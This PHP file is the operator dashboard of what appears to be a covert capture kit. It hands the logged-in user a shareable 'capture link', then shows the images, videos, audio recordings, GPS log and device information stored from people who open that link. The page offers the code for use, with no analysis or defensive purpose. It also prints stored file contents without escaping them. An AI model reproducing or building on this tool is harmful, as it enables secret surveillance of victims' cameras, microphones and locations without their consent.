<?php
session_start();
if(!isset($_SESSION['uid'])){ header("Location:index.php"); exit; }

$uid = $_SESSION['uid'];
$liveURL = "https://".$_SERVER['HTTP_HOST']."/cam/cam1.php?uid=".$uid;
?>

<!DOCTYPE html>
<html>
<head>
<title>User Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
body{font-family:Arial;margin:0;background:#fff;padding:15px;}
.box{padding:20px;border:1px solid #ddd;border-radius:10px;margin-bottom:20px;background:#fff;}
h2{color:red;}
a{color:red;font-weight:bold;}
img,video,audio{width:100%;margin:10px 0;border-radius:10px;}
</style>
</head>
<body>

<h2>Welcome</h2>

<div class="box">
<h3>Your Capture Link</h3>
<p>Share this link to start capturing:</p>
<strong><?php echo $liveURL; ?></strong>
</div>

<div class="box">
<h3>Your Saved Images</h3>
<?php
$path="uploads/$uid/images/";
if(is_dir($path)){
    foreach(glob($path."*.jpg") as $img){
        echo "<img src='$img'>";
    }
}
?>
</div>

<div class="box">
<h3>Your Videos</h3>
<?php
$path="uploads/$uid/videos/";
if(is_dir($path)){
    foreach(glob($path."*.webm") as $v){
        echo "<video controls src='$v'></video>";
    }
}
?>
</div>

<div class="box">
<h3>Audio Files</h3>
<?php
$path="uploads/$uid/audio/";
if(is_dir($path)){
    foreach(glob($path."*.mp3") as $a){
        echo "<audio controls src='$a'></audio>";
    }
}
?>
</div>

<div class="box">
<h3>GPS Log</h3>
<?php
if(file_exists("uploads/$uid/gps.json")){
    echo "<pre>".file_get_contents("uploads/$uid/gps.json")."</pre>";
}
?>
</div>

<div class="box">
<h3>Device Info</h3>
<?php
if(file_exists("uploads/$uid/info.json")){
    echo "<pre>".file_get_contents("uploads/$uid/info.json")."</pre>";
}
?>
</div>

</body>
</html>